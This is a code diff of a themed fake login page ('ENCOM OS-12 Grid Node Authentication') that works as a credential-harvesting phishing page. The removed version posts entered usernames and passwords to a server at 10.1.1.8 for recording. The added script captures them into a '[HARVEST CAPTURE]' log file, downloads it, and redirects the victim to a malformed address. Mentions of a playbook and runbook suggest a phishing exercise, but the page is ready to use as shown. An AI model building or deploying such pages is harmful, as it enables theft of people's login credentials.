@@ -5,32 +5,57 @@
     <title>ENCOM OS-12 Login</title>
     <style>
         body { background-color: #000; color: #00ffcc; font-family: monospace; padding: 50px; }
-        .login-box { border: 2px solid #00ffcc; padding: 20px; width: 300px; margin: 0 auto; box-shadow: 0 0 15px #00ffcc; }
-        input[type="text"], input[type="password"] { width: 100%; margin-bottom: 10px; background: #111; color: #fff; border: 1px solid #00ffcc; padding: 5px; box-sizing: border-box; }
-        input[type="submit"] { background: #00ffcc; color: #000; border: none; padding: 10px; width: 100%; cursor: pointer; font-weight: bold; }
-        input[type="submit"]:hover { background: #00b38f; }
-        h2 { text-align: center; margin-top: 0; }
+        .login-box { border: 2px solid #00ffcc; padding: 20px; width: 300px; margin: 0 auto; }
+        input[type="text"], input[type="password"] { width: 100%; margin-bottom: 10px; background: #111; color: #fff; border: 1px solid #00ffcc; padding: 5px; }
+        input[type="submit"] { background: #00ffcc; color: #000; border: none; padding: 10px; width: 100%; cursor: pointer; }
     </style>
 </head>
 <body>
 
 <div class="login-box">
     <h2>Grid Node Authentication</h2>
-    
-    <!-- 
-      The action parameter sends the captured inputs straight to your central server,
-      allowing a remote handler script to record the text to disk.
-    -->
-    <form action="http://10.1.1.8" method="POST">
-        <label for="username">Username:</label>
-        <input type="text" id="username" name="username" required autocomplete="off">
+    <form id="loginForm">
+        <label>Username:</label>
+        <input type="text" id="username" required autocomplete="off">
         
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password" required>
+        <label>Password:</label>
+        <input type="password" id="password" required>
         
         <input type="submit" value="ESTABLISH HANDSHAKE">
     </form>
 </div>
+
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault(); // Halt normal browser submission mapping
+    
+    var user = document.getElementById('username').value;
+    var pass = document.getElementById('password').value;
+    
+    // Format the capture data string to match your playbook log output
+    var logData = "[HARVEST CAPTURE] USER: " + user + " | PASS: " + pass + "!\n";
+    
+    // 1. Convert the plain text data string into a raw browser data Blob
+    var blob = new Blob([logData], { type: "text/plain" });
+    
+    // 2. Generate a temporary download link object in browser memory
+    var tempLink = document.createElement("a");
+    tempLink.href = URL.createObjectURL(blob);
+    
+    // 3. Name the downloaded file exactly what your runbook expects
+    tempLink.download = "encom_session_debug.txt";
+    
+    // 4. Append, trigger the download box window, and clean up instantly
+    document.body.appendChild(tempLink);
+    tempLink.click();
+    document.body.removeChild(tempLink);
+    
+    // 5. Short pause to let the browser catch the download trigger, then redirect
+    setTimeout(function() {
+        window.location.href = "http://10.1.1";
+    }, 500);
+});
+</script>
 
 </body>
 </html>
